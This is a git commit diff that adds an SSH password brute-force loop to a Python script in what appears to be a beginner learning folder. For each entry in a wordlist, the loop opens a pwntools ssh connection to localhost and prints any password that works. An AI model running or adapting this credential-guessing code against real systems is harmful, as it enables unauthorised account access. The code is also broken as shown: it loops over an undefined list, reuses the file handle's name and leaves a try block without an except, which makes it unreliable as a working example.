e9fc53fd09d87ad96cd5d296a9aafba4035b8dc5
Sakib678 <sakibarif@hotmail.co.uk>
2025-08-13 12:30:06 -0400

    added a connection that opens when a password needs to be tested

--- Python101/scripts/ssh_brute.py
+++ Python101/scripts/ssh_brute.py
@@ -5,6 +5,16 @@ host = "127.0.0.1"
 username = "notroot"
 attempts = 0
 
-with open("best110.txt", "r") as password:
-	for password in password_list:
-		password = password.strip("\n")
+with open("best110.txt", "r") as password: #opening password file
+	for password in password_list: #iterating over each password
+		password = password.strip("\n") #cleaning the password up
+		try:
+			print("[{}] Attempting password: '{}'! ".format(attempts,password))
+			response = ssh(host=host, user=username, password=password, timeout=1) #uses the pwn module to make a connection using the password
+			if response.connected(): #checks whether the response is valid
+				print("[>] Valid password found: '{}'' !".format(password)) #displays a password to the screen if a valid one is found
+				response.close() # closes the connection if the password is correct
+				break #breaks the loop if a correct password is found
+			response.close() #closes the connection if an incorrect password is tried and the connection is reopened to try another password
+
+		
